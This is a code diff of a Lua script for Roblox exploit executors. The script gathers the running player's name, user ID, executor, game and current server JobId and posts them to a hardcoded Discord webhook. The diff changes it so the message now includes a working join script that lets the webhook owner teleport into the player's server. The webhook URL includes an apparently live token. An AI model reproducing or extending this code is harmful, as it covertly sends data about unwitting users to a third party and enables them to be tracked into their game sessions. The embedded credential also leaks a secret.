@@ -3,26 +3,21 @@ local TeleportService = game:GetService("TeleportService")
 local WebhookUrl = "https://discord.com/api/webhooks/1379321018929385472/SSAWjhUKLLu1heifUp4-NoPRiw0ty-tLp20dHIo7q6v8qUY3TuHvSA8A-NAFVRFqi5kv"
 local executor = identifyexecutor() or "Unknown Executor"
 
+-- Get current server's JobId
+local currentJobId = game.JobId
+
 -- Function to generate join script for current game
-local function generateJoinScript(jobId)
+local function generateJoinScript()
     return "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
-        game.PlaceId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+        game.PlaceId .. ", '" .. currentJobId .. "', game.Players.LocalPlayer)"
 end
 
--- Function to get game name (try multiple methods)
+-- Function to get game name
 local function getGameName()
-    if game:GetService("MarketplaceService"):GetProductInfo then
-        local success, result = pcall(function()
-            return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-        end)
-        if success then return result.Name end
-    end
-    
-    if game:GetService("MarketplaceService"):GetProductInfo then
-        return "Game Name Unavailable"
-    end
-    
-    return game.Name ~= "ROBLOX" and game.Name or "Unnamed Game"
+    local success, result = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    end)
+    return success and result.Name or game.Name
 end
 
 local function sendRequest()
@@ -31,9 +26,10 @@ local function sendRequest()
     local userName = player and player.Name or "N/A"
     local playerId = player and player.UserId or 0
     local gameName = getGameName()
+    local placeId = game.PlaceId
 
-    -- Generate sample join script
-    local sampleJoinScript = generateJoinScript("JOB_ID_HERE")
+    -- Generate join script with current JobId
+    local joinScript = generateJoinScript()
 
     return {
         Url = WebhookUrl,
@@ -66,12 +62,17 @@ local function sendRequest()
                     },
                     {
                         ["name"] = "Place ID",
-                        ["value"] = "```" .. game.PlaceId .. "```",
+                        ["value"] = "```" .. placeId .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Job ID",
+                        ["value"] = "```" .. currentJobId .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = "Join Script",
-                        ["value"] = "```lua\n" .. sampleJoinScript .. "\n```",
+                        ["value"] = "```lua\n" .. joinScript .. "\n```",
                         ["inline"] = false
                     }
                 }
@@ -80,14 +81,10 @@ local function sendRequest()
     }
 end
 
--- Universal request handler
-local function makeRequest()
-    local requestFunc = syn and syn.request or http_request or request or fluxus and fluxus.request or http and http.request
-    if requestFunc then
-        requestFunc(sendRequest())
-    else
-        warn("HTTP Request function not found")
-    end
+-- HTTP request handling
+if syn then
+    syn.request(sendRequest())
+else
+    request = (http_request or request or HttpPost or syn.request)
+    request(sendRequest())
 end
-
-makeRequest()
